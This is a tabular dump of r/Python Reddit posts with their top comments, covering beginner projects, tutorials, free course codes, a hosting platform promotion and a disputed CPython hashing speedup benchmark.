I am well aware that you won't become proficient just by watching his videos but his tutorials get straight to the point and you understand the concept and you can build new things!",mCoding for advanced topics.
A Python class,99mmh3,2018-08-23 19:36:39,,Those are clearly cobras. Pythons are constrictors. 
I just wanted to share a script I've made to my dad,nikpnf,2021-05-22 23:12:03,"I've been learning python since January this year but never made a ""useful"" project. So my dad uses excel to keep track of his investments but has to update the stocks prices by hand, which takes a while. So recently I've found about openpyxl and thought why not automate this task? And so I did, using pandas\_datarequest for the stock prices, openpyxl to communicate with the file and tqdm for some cool progress bars. He liked it, turned a 10 minute boring process into a ≈1 min script.

Edit:  [here](https://github.com/BrunoPanizzi/stockPrices) is the github","Awesome, now charge your dad a 1% management fee to use your tool."
Guido with a painting of himself that was auctioned yesterday night at the PyLadies Auction 2019!,bl2d33,2019-05-06 04:07:51,,I’ve got you fam... https://i.imgur.com/No1gdoQ.jpg
I made a crude 5-axis CNC Simulator unsing PyQt5 and OpenGL,dppe0e,2019-10-31 23:46:34,,"""Crude"", he says, demoing something I can barely wrap my head around."
"Developers whose first programming language was Python, what were the challenges you encountered when learning a new programming language?",i6g0lk,2020-08-09 16:30:25,,"I learnt python first and then I moved onto learning C, when you learn a low level language like C after learning python you understand how much of the work python does for you. It was hard in the beginning especially with pointers but it wasn't too much of a problem just took some time."
"I made a terminal emulator with Vim-like modes and keybindings, a status line and an inline Python interpreter.",ffxioo,2020-03-10 00:42:24,,"https://github.com/Kharacternyk/viter

It is possible to call the methods of the window on the fly, thus changing the appearance or the keybindings. It is also possible to execute any other Python statements, such as arithmetic calculations."
Moon and Earth during a month long gravity simulation!,c1b3na,2019-06-16 23:27:01,,I think animations like this should have normalized axes so 1 unit on X and Y is the same
Just made my first “real” program and I’m super proud!,kdblfo,2020-12-15 09:25:10,"It’s nothing crazy, it’s really just manipulating a couple of lists, but I still think it’s super cool!

Edit: forgot to post the code lol

todo = []
done = []

x = ""Nothing""
todolength = 0
donelength = 0

while 0 == 0:
    print(""OPTIONS:"")
    print(""add: adds an item to your 'to do' list"")
    print(""remove: removes an item from your 'to do' list without moving it to your 'done' list"")
    print(""done: checks an item off your 'to do' list and moves it to your 'done' list"")
    print(""clr: opens the 'clear' menu"")
    print(""chk: opens the 'check' menu"")
    print(""What would you like do do?"")
    response = input()
    if response == ""add"":
        print(""What would you like to add? Type 'cancel' to cancel."")
        x = input()
        if x == ""cancel"":
            useless = 0
        else:
            todo.append(x)
            todolength = todolength + 1
            print(""%s added"" %x)
            input(""Press enter to continue"")
    elif response == ""remove"":
        if todolength == 0:
            print(""To do list empty! Congrats!"")
            input(""Press enter to continue"")
        else:
            print(""What would you like to remove? Type 'cancel' to cancel."")
            x = input()
            if x == ""cancel"":
                useless = 0
            elif x in todo:
                todo.remove(x)
                print(""%s removed"" %x)
                input(""Press enter to continue"")
            else:
                print(""ERROR 1: ITEM NOT IN LIST"")
                input(""Press enter to continue"")
    elif response == ""done"":
        if todolength == 0:
            print(""To do list empty! Congrats!"")
            input(""Press enter to continue"")
        else:
            print(""What would you like to mark 'done'? Type 'cancel' to cancel."")
            x = input()
            if x == ""cancel"":
                useless = 0
            elif x in todo:
                todo.remove(x)
                todolength = todolength - 1
                done.append(x)
                donelength = donelength + 1
                print(""Success! %s moved to 'done' list."" %x)
                input(""Press enter to continue"")
            else:
                print(""ERROR 1: ITEM NOT IN LIST"")
                input(""Press enter to continue"")
    elif response == ""clr"":
        print(""CLEAR MENU:"")
        print(""todo: clears 'to do' list"")
        print(""done: clears 'done' list"")
        print(""all: clears 'to do' and 'done' list"")
        print(""Type 'cancel' to cancel"")
        x = input()
        if x == ""cancel"":
            useless = 0
        elif x == ""todo"":
            print(""Are you sure? (type 'YES' to confirm)"")
            response = input()
            if response == ""YES"":
                todo.clear()
                todolength = 0
                print(""To do list cleared"")
                input(""Press enter to continue"")
            else:
                useless = 0
        elif x == ""done"":
            print(""Are you sure? (type 'YES' to confirm)"")
            response = input()
            if response == ""YES"":
                done.clear()
                donelength = 0
                print(""Done list cleared"")
                input(""Press enter to continue"")
        elif x == ""all"":
            print(""Are you sure? (type 'YES' to confirm)"")
            response = input()
            if response == ""YES"":
                todo.clear()
                done.clear()
                todolength = 0
                donelength = 0
                print(""All lists cleared"")
                input(""Press enter to continue"")
            else:
                useless = 0
        else:
            print(""ERROR 2: INVALID INPUT"")
            input(""Press enter to continue"")
    elif response == ""chk"":
        print(""CHECK MENU:"")
        print(""todo: checks 'to do' list"")
        print(""done: checks 'done' list"")
        print(""all: checks both lists"")
        print(""Type 'cancel' to cancel."")
        x = input()
        if x == ""cancel"":
            useless = 0
        elif x == ""todo"":
            print(todo)
            input(""Press enter to continue"")
        elif x == ""done"":
            print(done)
            input(""Press enter to continue"")
        elif x == ""all"":
            print(""To do:"")
            print(todo)
            print(""Done:"")
            print(done)
            input(""Press enter to continue"")
        else:
            print(""ERROR 2: INVALID INPUT"")
            input(""Press enter to continue"")
    else:
        print(""ERROR 2: INVALID INPUT"")
        input(""Press enter to continue"")

I know it looks all messed up that’s just because I’m on mobile rn lol",That feeling never goes away whenever you get a piece of code to work. Congrats!
"Hey, I made a Python For Beginners Crash Course! I laid out everything I remember finding hard to understand in the beginning, and I tried to organize everything in the best way possible! Do you guys have some feedback?",jye99o,2020-11-22 01:05:35,,This might go well in r/learnpython too!
"Just wanted to give everyone a heads up, the Introduction to Computer Science and Programming Using Python on EdX is a free MIT course starting Jan 22 and open for enrollment.",el3twl,2020-01-07 09:17:53,,"Got a question about this, it's free if we audit the course right? Can I complete the course in audit mode and if in the future I want the certificate can I just pay for it after? Given that I do all the graded stuff or will it want me to rewatch videos etc.

Thanks! I have 0 knowledge with python and I'm studying in a Stem field. I figured learning would be helpful for me in the future so I'm trying to find a good course in the meantime and maybe when I start looking for a job a certificate may be a little boost in my empty resume in addition to the self taught things."
Coding an Age Prediction Neural Network in 10 Minutes w/ Python!,ljurx4,2021-02-15 03:01:12,,"It's a neat speedrun, but it kinda just seemed like you were replicating a pattern you already knew. For your next video, if you could discuss more about underlying concepts of what your script does, it would really make a great tutorial."
youtube-dl has a JavaScript interpreter written in pure Python in 870 lines of code,xbefip,2022-09-11 17:47:51,,    import youtube as yt
"78 Python data science practice problems in a single github repo including numpy, pandas, matplotlib, scipy, regex, pytorch",u77fce,2022-04-19 23:10:50,,"Huh, neat. Maybe I’ll finally get started on learning numpy and matplotlib."
[OC] How to use Selenium and Selenium webdriver manager to login to a website with Python,ia6s4i,2020-08-15 20:49:52,"Hey r/Python!

My last post was really well received so I am back again with another tutorial all about how to use Python to login to a website [https://www.youtube.com/watch?v=BZMVoYhA7KU](https://www.youtube.com/watch?v=BZMVoYhA7KU) with Selenium and simplifying the process by using Selenium webdriver manager

As always, I hope you find it useful and if you have any questions or video tutorial requests please drop me a note in the comments.",Great video! Do you have any tips on the best way to store and call your login credentials so they aren’t saved in with the code?
Not just for Django: the Django Girls tutorial is an excellent and hospitable Python introduction,jkb80z,2020-10-29 22:39:21,"While the great work of [Django Girls](https://djangogirls.org/) is well known, I only recently took a good look at [their tutorial](https://tutorial.djangogirls.org/).

I really don't do much Django development, but this is so well written and welcoming, I recommend it simply as a great way to learn Python.

When first coming to Python, people often desire both an introduction to the language, and some idea of problems they might solve. This seems to provide both.

(Apologies to r/learnpython for first posting this there, but that subreddit is only for questions, I think.)","I am senior engineer now, but when I first started learning web dev and Django, nothing made much sense, mainly due to the ""magic"" of Django. Django Girls was the best resource I could find. This was about 6 years ago now. For years I recommended this site for anyone trying to learn Django until I just forgot about it.
Thank you for reminding me. It brings back a lot of fond memories of those days."
Flowchart Recognition,hgtyo6,2020-06-27 21:58:30,,What are your intended uses of this? Do you get any meaningful information about which nodes connect to each other?
My first Completed project,md8qu4,2021-03-26 05:20:42,"I am sobbing . 

I've struggled with learning a computer language for years , I've started many projects that I've never completed , I always thought It was me and that I just wasn't cut out for it. 

to make a long story short , I recently lost my job and I've decided that I want to try and become a software developer. 

today I completed my first project , its just a simple blackjack game but it means so much to me that it runs. 

here is the link : [https://github.com/Quantsol/Simple-Blackjack-Game](https://github.com/Quantsol/Simple-Blackjack-Game) 

&#x200B;

any feedback would be helpful . Im not really sure how to make a portfolio page on github but I hope to post more projects in the future.

&#x200B;

cheers yall","It's not about the amount of completed projects, it's about what you learn from the projects."
Advanced Visual Studio Code for Python Developers – Real Python,qt3x3w,2021-11-13 23:49:12,,Thanks! The thunder client looks like a nice alternative the the normal rest extension. Also I think I might need a pet now.
[tutorial] How to host for free your Python app,mnbrrk,2021-04-09 15:10:19,"Hosting Python applications is easy, finding a completely free Python hosting service that is reliable is not. This post will show you how you can host your Python app on [Qovery](https://www.qovery.com) \- A 100% free hosting platform (no credit card required!!) used by 1800+ developers in 102 countries 🌎.

&#x200B;

With Qovery you can deploy your Python app with PostgreSQL, MySQL, and MongoDB databases for free.

*Disclaimer: I am the co-founder of Qovery.*

>I am pleased to announce that Qovery supports individual developers /  open source and non profit projects to host up to 3 applications  (database included) for free. Our business model is based on Enterprise hosting, which gives us the possibility to offer generous free plans. [Read more](https://www.qovery.com/blog/qovery-is-free-for-open-source-projects) \- In exchange we ask for product feedback - [join our Discord](https://discord.qovery.com)

You can read more about [Qovery vs. Heroku](https://docs.qovery.com/docs/getting-started/qovery-vs-other/heroku/).

## Deploy your Python app

⚠️ You need to have a Python project on Github or Gitlab that you want to deploy.

Given you have registered on to [Qovery](https://www.qovery.com) and you are logged into Qovery, follow the steps below:

* Go to Qovery, click the button “Create a new project” button in the middle of Qovery
* Give a name to your project - in my case ""Quotes""
* Add an application
* After that, click “I have an application”.

&#x200B;

[Then select \\""Github\\"" or \\""Gitlab\\"" and pick your repository - mine is \\""python-postgresql\\"".](https://preview.redd.it/2ghqxrark3s61.jpg?width=880&format=pjpg&auto=webp&s=77e8b27085031de0701efafd80cb4222df0794f9)

[Give a name to your app](https://preview.redd.it/cinic9hpk3s61.jpg?width=880&format=pjpg&auto=webp&s=4c4e62db49fbe359fbac9ffa0ba6b7dc17cc1d71)

[Select PostgreSQL](https://preview.redd.it/ihuauo2ok3s61.png?width=880&format=png&auto=webp&s=1cdb8fa49307e8d2e0014d0ae9c10ceec0cc24fa)

[Select the version of your DB and give it a friendly name](https://preview.redd.it/mvlyurqmk3s61.png?width=880&format=png&auto=webp&s=caf5e70728e95f3b09fe53415187c514d7b3a384)

[Deploy and TADA](https://preview.redd.it/gqnmhrpck3s61.png?width=2728&format=png&auto=webp&s=ca68834b85b4535d1bc4695c1dca03f34d53fd42)

## Conclusion

Hosting a project with Python should not be a hassle. Qovery got your back and provide everything that you need like free SSL, database, CDN to deploy your Python apps.

Give it a try now and leave me your feedback in the comments👇.

**⚠️ Important Note** ⚠️

If your deployment failed, don't forget to:

1. Provide a valid Dockerfile. 
2. Declare your Python app port in your `.qovery.yml`. [Read this doc](https://docs.qovery.com/docs/using-qovery/configuration/applications/#publicly-accessible)

Happy coding 🔥","Thank you for including custom domain and TLS in the free tier!
Will certainly give it a try as an alternative to Heroku :)"
"I made a python script that helps you to search, download movie posters and set them as folder icons. PosterPy uses the popular IMDbPY package to search movies and TMDb a.k.a The Movie Data Base API to download movie posters.",g6jqtb,2020-04-23 17:39:31,,Here is the repo link - [https://github.com/sameera-madushan/PosterPy](https://github.com/sameera-madushan/PosterPy)
"2,000 free sign ups available for the ""Automate the Boring Stuff with Python"" online course. (Jan 2023)",101p7xy,2023-01-03 06:04:53,"UPDATE: The signs up are all used up. (Whoa, that was fast this month.) I'll release new codes on Feb 1st. But you can still see the first 15 of the 50 videos [on YouTube](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW), and the [Previews for all the videos are enabled on the course page](https://udemy.com/course/automate/).

If you want to learn to code, I've released 2,000 free sign ups for my course following my Automate the Boring Stuff with Python book (each has 1,000 sign ups, use the other one if one is sold out): 

~~https:// udemy. com/course/automate/?couponCode=JAN2023FREE~~

~~https:// udemy. com/course/automate/?couponCode=JAN2023FREE2~~

Udemy has changed their promo code and severely limited the number of sign ups I can provide each month, so only sign up if you are reasonably certain you can eventually finish the course. [The first 15 of the course's 50 videos are free on YouTube if you want to preview them.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

YOU CAN ALSO WATCH THE VIDEOS WITHOUT SIGNING UP FOR THE COURSE. All of the videos on the course webpage have ""preview"" turned on. Scroll down to find and click ""Expand All Sections"" and then click the preview link. You won't have access to the forums and other materials, but you can watch the videos.

**NOTE: Be sure to BUY the course for $0, and not sign up for Udemy's subscription plan. The subscription plan is free for the first seven days and then they charge you. It's selected by default. If you are on a laptop and can't click the BUY checkbox, try shrinking the browser window. Some have reported it works in mobile view.**

Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later.

Some people in India and South Africa get a **""The coupon has exceeded it's maximum possible redemptions""** error message. [Udemy advises that you contact their support if you have difficulty applying coupon codes, so click here to go to the contact form.](https://support.udemy.com/hc/en-us/requests/new?type=student) If you have a VPN service, try to sign up from a North American or European proxy.

**I'm also working on another Udemy course** that follows my recent book ""Beyond the Basic Stuff with Python"". So far I have [the first 15 of the planned 56 videos done. You can watch them for free on YouTube.](https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow&index=1)

Side note: My latest book, Python Programming Exercises Gently Explained is a set of 42 programming exercises for beginners [for free](https://inventwithpython.com/pythongently/) or as a [99 cent ebook](https://www.amazon.com/Python-Programming-Exercises-Gently-Explained-ebook/dp/B0BGYJ7G6T/).


**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",What a legend you are and thank you! I just signed up :)
I wrote a book on machine learning w/ python code,t8st9l,2022-03-08 00:17:47,"Hello everyone. My name is Andrew and for several years I've been working on to make the learning path for ML easier. I wrote a manual on machine learning that everyone understands - Machine Learning Simplified Book.

The main purpose of my book is to build **an intuitive understanding** of how algorithms work through basic examples. In order to understand the presented material, it is enough to know basic mathematics and linear algebra.

After reading this book, you will know the basics of supervised learning, understand complex mathematical models, understand the entire pipeline of a typical ML project, and also be able to share your knowledge with colleagues from related industries and with technical professionals.

And for those who find the theoretical part not enough - I supplemented the book with a repository on **GitHub**, which has Python implementation of every method and algorithm that I describe in each chapter ([https://github.com/5x12/themlsbook](https://github.com/5x12/themlsbook)).

You can read the book absolutely free at the link below: -> [https://themlsbook.com](https://themlsbook.com/)

I would appreciate it if you recommend my book to those who might be interested in this topic, as well as for any feedback provided. Thanks! (attaching one of the pipelines described in the book).;

&#x200B;

https://preview.redd.it/o8r8luzelzl81.png?width=1572&format=png&auto=webp&s=08dd448e3a024cb7b28e7d5a12085f56819e26ed","While I really like some sections of the book, one thing I would like to see more of is explanations of the actual math that is occurring. A breakdown for how gradients are updated every loop and how the numbers change. 

[https://mmuratarat.github.io/2020-01-09/backpropagation](https://mmuratarat.github.io/2020-01-09/backpropagation) this is a good example, but I've seen even simpler versions too. I wrote something like this for myself one day."
Sentiment Analysis on Tech News,jensl9,2020-10-20 19:41:02,,"This application categorizes mobile device Reddit post titles by topic, score and sentiment. Data is pulled via the Reddit API using a series of queries for popular link posts. In many but not all cases, the titles of these posts are headlines for news articles.

Reddit post titles are labeled using two categories:

\- Score - hard data vs rumors  
\- Sentiment - happy vs unhappy

tldrstory is a framework for building AI-powered applications that understand headlines and story text. tldrstory is configured via YML to quickly scaffold machine learning jobs, a backend API and front-end application to review/analyze the data.

A zero-shot classifier, backed by a large general language model with no labeled data, is used to label data. Additionally, a txtai index enables ad hoc similarity searches against the data.

tldrstory is built on the following stack:

\- txtai  
\- Transformers  
\- Sentence Transformers  
\- Streamlit  
\- FastAPI

Live demo: [https://tldrstory.com/mobile-tech](https://tldrstory.com/mobile-tech)

Github repo: [https://github.com/neuml/tldrstory](https://github.com/neuml/tldrstory)

Configuration files:

[https://github.com/neuml/tldrstory/blob/master/apps/devices-app.yml](https://github.com/neuml/tldrstory/blob/master/apps/devices-app.yml)  
[https://github.com/neuml/tldrstory/blob/master/apps/devices-index.yml](https://github.com/neuml/tldrstory/blob/master/apps/devices-index.yml)"
"During lockdown, I developed an open-source python package for efficient text data analysis, it's called Texthero. Extra information in the comments.",hl8y9n,2020-07-05 03:18:38,,"I'm very happy to announce to you, Python subreddits, Texthero, a python package to work with text-based dataset quickly and effortlessly. Texthero is very simple to learn and designed to be used on top of Pandas.

I have been looking for a similar project for long time and as I couldn't find one I developed myself. A big thank you goes to the r/LanguageTechnology subreddits that gave me precious feedback on how to improve the package.

The package is particularly designed for developers that wants a simple-yet-powerful way of cleaning and analyzing text data. As an NLP developer, I'm using Texthero in many personal projects as it allows me to gain precious time; I believe it can help you too!

The feature I like most (and hopefully you too) of this package is that it's super easy to use and to learn and it's very well documented. I spent more time writing the docstring and building the website and documentation than writing the code itself!

Any contribution/feedback/advice is very welcome! This is a project by a member of the python community for the whole python community! I'm looking forward to learn from you.

Github repository: https://github.com/jbesomi/texthero

Getting started: https://texthero.org/docs/getting-started

API docs: https://texthero.org/docs/api-preprocessing"
"My Python Youtube channel just hit 10,000 subscribers - buildwithpython",di5nw6,2019-10-15 17:59:15,"Hey guys, 

A lot of you from Reddit have been part of the buildwithpython community. It's fun creating videos. Just wanna thànkyou for sticking around.

Learning new things and teaching it to other people. I finally found what I love doing. 

If someone is curious about the channel - 
youtube.com/c/buildwithpython

Or you can just search for buildwithpython on YouTube.

Just wanted to share my happiness with the community :)","[Link for the lazy](https://www.youtube.com/channel/UCirPbvoHzD78Lnyll6YYUpg/videos)

I saw your first video when you posted over a year ago. I'm glad you kept it up and improved on your production as well. Way to go!"
Advanced football (soccer) analytics: building and applying a pitch control model in Python,g9j8mo,2020-04-28 16:13:48,,"This is a really niche topic (Football/Soccer analytics), although its reach could be high, so let me contextualize a little bit (btw, I'm using the word Football from now on):

Football statistics were traditionally based on specific event: passes and shots. From these you can compute certain statistics like % of Possession (contrary to what it may look, % Possession is calculated from passes, not actual possession time) and Shots on Target.

Football is notoriously a low scoring sport, and shots differ in quality quite a bit, so a measure was created to address this: Expected Goals (xG). This was around 2010, and only this season hit the mainstream as the Premier League broadcasters started to present those values (based on Opta's model).

More advanced stats, but similar in concept, were created since, like Expected Assists and [xG Chain](https://statsbomb.com/2018/08/introducing-xgchain-and-xgbuildup/) (in this case, a value is attributed to each player that participated in the possession chain).

But even shots are kind of rare (usually around 10 shots on target per match), and these stats completely disregard the defensive side of the equation, so increasingly full positional data is used in Football Analytics.

In 2018, William Spearman presented an influential paper at MIT Sloan Sports Analytics Conference called ""[Beyond Expected Goals](http://www.sloansportsconference.com/wp-content/uploads/2018/02/2002.pdf)"" (this video is an open implementation of that paper). He was later hired by Liverpool FC as their lead Data Scientist.

You can watch a video by Spearman himself about the Pitch Control Model and recent innovations [here](https://www.youtube.com/watch?v=X9PrwPyolyU).

As you can see, this is pretty close to the state of the art in Football Analytics. It's a huge moment that very few people noticed, so I'm trying to get it out there.

Sorry for the long post, hopefully this is interesting to someone."
My weekend project was to write a visual sudoku solver without looking into how other ones are implemented before hand.,jqc9ml,2020-11-08 22:06:58," I started solving sudoku puzzles a couple of weeks ago and I enjoy it very much. Because I got more confident in my skills of solving it by hand I wanted to see if I could write a computer program to do it for me. Analogue to the old saying “You never really know something until you teach it to someone else”, I thought I'd teach my computer. 😊🖥️ 

&#x200B;

Demo video is here: [https://www.youtube.com/watch?v=MvDNnjlcqoY](https://www.youtube.com/watch?v=MvDNnjlcqoY)  


Code can be found here: [https://github.com/tymscar/Pygame-Sudoku-Solver](https://github.com/tymscar/Pygame-Sudoku-Solver)","Sometimes we can set off on projects and get the thought in our heads that it can be a big open source thing people will like and contribute to... but doing things like this is super fun!

It’s my opinion that self-starting and doing things like this is 10x better than classroom learning. Teaches critical thinking, problem solving better than anything."
A REAL Python cheat sheet for beginners,7n1c9u,2017-12-30 20:33:24,,"This would be much better if it was in a Jupyter Notebook with a  Table of Content.

Example:
http://nbviewer.jupyter.org/github/pybokeh/ipython_notebooks/blob/master/pandas/PandasCheatSheet.ipynb"
"Nice lil’ easter egg, I suppose",6wrd8t,2017-08-29 21:55:12,,"On a serious note, does this create any problems, because the hash of the actual integer 314159 is the same?"
pathlib instead of os. f-strings instead of .format. Are there other recent versions of older Python libraries we should consider?,rjg2yd,2021-12-19 04:40:10,,"Use ZoneInfo instead of pytz on Python 3.9+

https://docs.python.org/3.9/library/zoneinfo.html

https://blog.ganssle.io/articles/2018/03/pytz-fastest-footgun.html"
Some AI tutoring so you can learn Python at a fast pace,nu8zzr,2021-06-07 18:21:48,"When I start learning something I want it to be fun and fast-paced so I can progress quickly!

We built an AI tutoring system ([Kikodo](https://www.kikodo.io/)) on top of small interactive exercises, so you can learn lots about programming in short spurts, whenever you have time. Each question has a code analyzer that reads your code and gives you personalized hints to improve your answer. It reviews code accuracy, quality, efficiency.

For now, we only have Python fundamentals, which can be completed in under two weeks' time! What subject would you recommend us to add next? We were thinking of Pandas.",Maybe some basic oop
Red Hat Confirms RHEL 8 Will Drop Python 2,8bb6oq,2018-04-11 04:41:18,,Meanwhile it'll take another two years for everyone to start adopting RHEL 7
"40 Python Data Visualizations (plots, graphs, charts) with code",76dfoc,2017-10-15 01:22:10,,This is amazing. Thank you!
My software muCLIar is a YouTube Automator that plays your music right from your Command-Line so that your development flow is not interrupted. Link: github.com/aayush1205/muCLIar,eyb3de,2020-02-04 02:07:42,,"That's: [github.com/aayush1205/muCLIar](https://github.com/aayush1205/muCLIar)

for anyone like me thats lazy and wants a clickable link."
I wrote a Python program that produces random chord progressions,ob0jtz,2021-07-01 00:10:36,"The program prints out a semi-random sequence of chords based on a major or minor tonic. The progression will always have at least one occurrence of the tonic chord. The ""Jazziness"" slider determines the probability of 7th chords.

Demo video: [https://youtu.be/Pj6JNkYeW0Y](https://youtu.be/Pj6JNkYeW0Y)

This is just a silly little project I did for Tkinter practice and has probably been done many times before but if anyone is interested in the (mess of a) source code my DMs are open!

EDIT: The source code is now on Github: [https://github.com/CicadaFlight/chords-generator](https://github.com/CicadaFlight/chords-generator)",Is the code in GitHub?
I made a simple remote controller for YouTube and Twitch with Python and Telegram,lzrc0z,2021-03-07 22:06:26,"Sometimes I watch Twitch from bed in the evening. I'm lazy and I don't wanted get out of bed for turn the volume up/down or shutdown the PC, so I made this small script for browse Twitch (and YouTube) with my smartphone. GitHub: [github.com/alessiocelentano/lazynite](https://github.com/alessiocelentano/lazynite)

&#x200B;

https://reddit.com/link/lzrc0z/video/twrm4aqs4ml61/player",Lazy people create the best inventions
Lost Phone,cbgpqu,2019-07-10 21:28:25,"Has anyone on this sub lost a phone on Alnmouth beach Northumberland? We can’t ring the contact who text the phone but there was a notification from this sub.

Edit: The phone was found on the beach between Alnmouth and Warkworth","Just in case the owner sees these comments, we have left the phone with the EE shop on the retail park in Alnwick. The store assistant David is posting on the local Facebook pages so I’m really hoping this can be returned to the owner"
MicroPython officially becomes part of the Arduino ecosystem | Arduino Blog,yrldcw,2022-11-11 01:09:53,,"It would be nice if the Arduino IDE supports micropython, otherwise it's just another micropython IDE."
"Thanks, and that’s coming from a 13 year old.",oc9vlj,2021-07-02 21:15:50,"So, I know I’m going to get a good amount of hate from this post. But that’s okay. I’m still happy to share my gratitude.

But before I start, here’s a couple things to take into account. One, this is my alt account, since I would prefer not to have this post on my main account. Second, even though I’ve been coding for 3 years, I’m not that far ahead. I’ve been moving pretty slowly, and only work on it every Saturday for some amount of time. The rest of my week is spent working on my blog, doing school, with friends, and doing chores.

Ok, so now I’ll begin. I’ve been coding for 3 years. I started looking at Reddit about a year and a half ago, just online when I didn’t have an account. Then I made an account, and started learning a ton of this subreddit.

I already have an idea for my career, because if YOU. I can’t believe I actually can do this. I know so many people that are 35 and work at Cookout, so the fact you guys helped me find my dream career just blows my mind. 

I’m currently learning Data Science, which plan on learning Machine Learning after. I’ve learned the basics, all the way up to classes and such, as well as search algorithms to create AIs. My most recent one was an AI that solved an 8-Puzzle, using A* Search. Where did I learn about this algorithm? On this subreddit.

Now I’ve never been the best at writing, so I’m running out of ideas in what to say. But I just wanted to let you know that you just made a lost, depressed 13 year old with anxiety, go to a happy, passionate 13 year old with career ahead of him.

That’s all I have to say, so goodbye :)

Edit: Well now I have another thing to thank you for. For all the support you’ve given me. I thought I would be getting a good amount of hate, but I haven’t seen any so far! It’s really motivated me to keep practicing and work on new projects, so thanks!

Edit #2: We are officially the top post(As of 7/3/21)!!! We have over 700 upvotes and over 200 comments, thanks! And a special thanks to all these amazing Redditors giving these awards!",My only question is why does a 13 year old know so many 35 year olds working at cookout?
A PlantsVsZombies game written fully in python,mwrxl4,2021-04-23 18:05:27,"This is definitely a fun python project written with the pygame library:

[https://github.com/marblexu/PythonPlantsVsZombies](https://github.com/marblexu/PythonPlantsVsZombies)

&#x200B;

https://preview.redd.it/hsihc8u3iwu61.jpg?width=1001&format=pjpg&auto=webp&s=5e1dcf9104138fa38605cab29a04c082a5c70089",Well done! I would recommend to remove the assets. This is where you could get a DMCA takedown notice. Those in similar predicament usually provide their open source engine and use the assets from an existing installation. Gamers must have their own legal copy of the game.
I made a perlin gif generator,g2zsda,2020-04-17 18:57:02,,"Github repo : [https://github.com/LoicGoulefert/perlin-gif](https://github.com/LoicGoulefert/perlin-gif)

The installation steps are provided for Linux only. You can play around with the CLI and the post-processing pipeline. For example, this gif used reduced brightness and 16 colors quantization.

I'd love to have some feedback on this ! :)

Edit: Here are some of the articles / blogs that inspired to do it : [perlin noise in processing](https://necessarydisorder.wordpress.com/2017/11/15/drawing-from-noise-and-then-making-animated-loopy-gifs-from-there/), this [article](http://staffwww.itn.liu.se/~stegu/simplexnoise/simplexnoise.pdf) explaining perlin and simplex noise."
76% Faster CPython,mgi4op,2021-03-30 23:08:03,"It started with an idea: *""Since Python objects store their methods/fields in* ***\_\_dict\_\_****, that means that* ***dictionaries/hash tables power the entire language.*** That means that Python spends a significant portion of its time hashing data. What would happen if the hash function Python used was swapped out with a much faster one? ***Would it speed up CPython?****""*

So I set off to find out.

The first experiment I ran was to find out how many times the hash function is used within a single print(""Hello World!"") statement. **Python runs the hash function 11 times for just this one thing!**

Clearly, a faster hash function would help at least a little bit.

I chose [xxHash](https://github.com/Cyan4973/xxHash) as the ""faster"" hash function to test out since it is a single header file and is easy to compile.

I swapped out the default hash function used in the Py\_hash\_t \_Py\_HashBytes(const void \*src, Py\_ssize\_t len) function to use the xxHash function XXH64.

*The results were astounding.*

I created a [simple benchmark](https://github.com/Pebaz/cpython/blob/master/benchmark.py) (targeted at hashing performance), and ran it:

**CPython with xxHash hashing function was 62-76% faster!**

I believe the results of this experiment are worth exploring by a CPython contributor expert.

[Here is the code](https://github.com/Pebaz/cpython) for this for anyone that wants to see whether or not to try to spend the time to do this right (perhaps not using xxHash specifically for example). The only changes I made were copy-pasting the xxhash.h file into the [include directory](https://github.com/Pebaz/cpython/blob/master/Include/xxhash.h) and using the [XXH64 hashing function](https://github.com/Pebaz/cpython/blob/5de1728ca8697461d6fc3aa6bbcf656f6145acf1/Python/pyhash.c#L203) in the \_Py\_HashBytes() function.

I want to caveat the code changes by saying that I am not an expert C programmer, nor was this a serious effort, nor was the macro-benchmark by any means accurate (they never are). This was simply a proof of concept for food for thought for the experts that work on CPython every day and it may not even be useful.

**Again, I'd like to stress that this was just food for thought, and that all benchmarks are inaccurate.**

However, I hope this helps the Python community as it would be awesome to have this high of a speed boost.","I wasn't able to reproduce your speed findings

I also decided to run this through [pyperf](https://pyperf.readthedocs.io/en/latest/analyze.html) to see if there was any significant difference

here's the result of comparing the two -- seems at most a ~1-2% speedup, and maybe not significant at that

    $ ./prefix/bin/pyperf compare_to ../cpython/cp.json xx.json
    chaos: Mean +- std dev: [cp] 315 ms +- 12 ms -> [xx] 309 ms +- 11 ms: 1.02x faster
    dulwich_log: Mean +- std dev: [cp] 123 ms +- 4 ms -> [xx] 120 ms +- 5 ms: 1.02x faster
    fannkuch: Mean +- std dev: [cp] 1.55 sec +- 0.03 sec -> [xx] 1.49 sec +- 0.03 sec: 1.04x faster
    float: Mean +- std dev: [cp] 356 ms +- 10 ms -> [xx] 361 ms +- 11 ms: 1.01x slower
    genshi_text: Mean +- std dev: [cp] 91.3 ms +- 3.9 ms -> [xx] 89.4 ms +- 3.6 ms: 1.02x faster
    genshi_xml: Mean +- std dev: [cp] 193 ms +- 9 ms -> [xx] 186 ms +- 7 ms: 1.03x faster
